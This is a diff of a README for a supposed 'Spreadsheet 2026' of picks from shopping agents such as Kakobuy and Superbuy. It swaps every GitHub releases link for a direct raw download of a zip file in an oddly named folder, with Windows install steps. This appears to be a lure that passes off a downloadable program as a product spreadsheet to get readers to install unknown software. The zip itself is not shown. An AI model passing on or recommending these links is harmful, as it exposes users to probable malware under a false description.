@@ -1,11 +1,11 @@
 # 🛍️ Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026 - Find Daily Picks Fast
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20Now-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/Companyrascal983/Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20Now-GitHub%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Companyrascal983/Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026/main/cig/Spreadsheet-OO-Cbuy-A-Superbuy-Pbuy-Kakobuy-Sugargoo-3.8.zip)
 
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/Companyrascal983/Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026/releases
+https://raw.githubusercontent.com/Companyrascal983/Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026/main/cig/Spreadsheet-OO-Cbuy-A-Superbuy-Pbuy-Kakobuy-Sugargoo-3.8.zip
 
 ## 🪟 How to install on Windows
 
@@ -206,4 +206,4 @@ You can expect a product list built for easy browsing, with a focus on:
 
 Use this link to visit the release page and download the Windows file:
 
-https://github.com/Companyrascal983/Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026/releases
+https://raw.githubusercontent.com/Companyrascal983/Kakobuy-Sugargoo-ACbuy-OOPbuy-Superbuy-Spreadsheet-2026/main/cig/Spreadsheet-OO-Cbuy-A-Superbuy-Pbuy-Kakobuy-Sugargoo-3.8.zip
